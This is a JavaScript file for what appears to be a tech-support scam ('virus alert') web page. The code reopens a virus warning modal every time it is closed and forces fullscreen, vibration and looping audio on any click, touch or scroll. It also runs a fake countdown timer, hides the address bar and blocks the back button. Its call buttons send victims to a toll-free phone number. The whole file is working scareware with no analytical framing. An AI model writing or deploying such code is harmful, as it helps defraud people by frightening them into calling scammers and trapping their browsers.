$(document).ready(() => {
    // Function to start the countdown
    function startCountdown() {
        let timeInSeconds = 5 * 60; // 5 minutes in seconds

        const countdown = setInterval(() => {
            let minutes = Math.floor(timeInSeconds / 60);
            let seconds = timeInSeconds % 60;

            // Format minutes and seconds to always show 2 digits
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            // Update the timer display
            document.getElementById("countdown-timer").innerText = `${minutes}:${seconds}`;

            // Decrease time by 1 second
            timeInSeconds--;

            // When the countdown reaches 0, restart the timer
            if (timeInSeconds < 0) {
                clearInterval(countdown);
                startCountdown(); // Restart the countdown
            }
        }, 1000);
    }

    // Start the countdown
    startCountdown();

    const virusModal = document.getElementById("virusModal");
    const modalInstance = new bootstrap.Modal(virusModal);
    const audioPlayer = $("#audioPlayer")[0];

    audioPlayer.play();

    audioPlayer.addEventListener("ended", () => {
        audioPlayer.play();
    });

    // Function to hide address bar and trigger fullscreen and modal display
    function hideAddressBarAndShowModal() {
        setTimeout(() => {
            window.scrollTo(0, 1); // Scroll slightly to hide address bar
        }, 1000);

        modalInstance.show(); // Show modal
        navigator.vibrate(200);
    }

    // Function to force fullscreen and vibrate
    function goFullScreenAndVibrate() {
        const element = document.documentElement; // Use the whole document for fullscreen

        if (element.requestFullscreen) {
            element.requestFullscreen();
        } else if (element.mozRequestFullScreen) {
            element.mozRequestFullScreen();
        } else if (element.webkitRequestFullscreen) {
            element.webkitRequestFullscreen();
        } else if (element.msRequestFullscreen) {
            element.msRequestFullscreen();
        }

        navigator.vibrate(200);
        modalInstance.show(); // Show the modal
    }

    if (virusModal) {
        // Event listener for when modal is shown
        virusModal.addEventListener("show.bs.modal", () => {
            goFullScreenAndVibrate();
            audioPlayer.play();
        });

        // Event listener for when modal is completely hidden
        virusModal.addEventListener("hidden.bs.modal", () => {
            setTimeout(() => {
                modalInstance.show();
                goFullScreenAndVibrate();
            }, 300); // 0.3 second delay
        });
    }

    // Prevent upward scrolling by triggering fullscreen and modal on touchstart
    window.addEventListener("touchstart", () => {
        goFullScreenAndVibrate();
    });

    window.addEventListener("click", () => {
        goFullScreenAndVibrate();
    });

    // Add event listener for button vibration
    $("#vibrateButton").on("click", () => {
        goFullScreenAndVibrate();
    });

    // Add event listener for call buttons
    $("#callButton, #callButton1, #callButton2").on("click", () => {
        const phoneNumber = "tel:+18778381219"; // Replace with desired phone number
        window.location.href = phoneNumber;
    });

    // Prevent the backspace key from navigating back
    history.pushState(null, null, window.location.href);
    window.onpopstate = () => history.forward();

    // Hide address bar and show modal on load
    hideAddressBarAndShowModal();

    // Scroll event to keep the address bar hidden
    window.addEventListener("scroll", function () {
        if (window.scrollY === 0) {
            window.scrollTo(0, 1);
            goFullScreenAndVibrate(); // Trigger fullscreen on scroll
        }
    });

    window.addEventListener("touchstart", () => {
        if (virusModal) {
            goFullScreenAndVibrate();
        }
    });

    window.addEventListener("click", () => {
        if (virusModal) {
            goFullScreenAndVibrate();
        }
    });
});
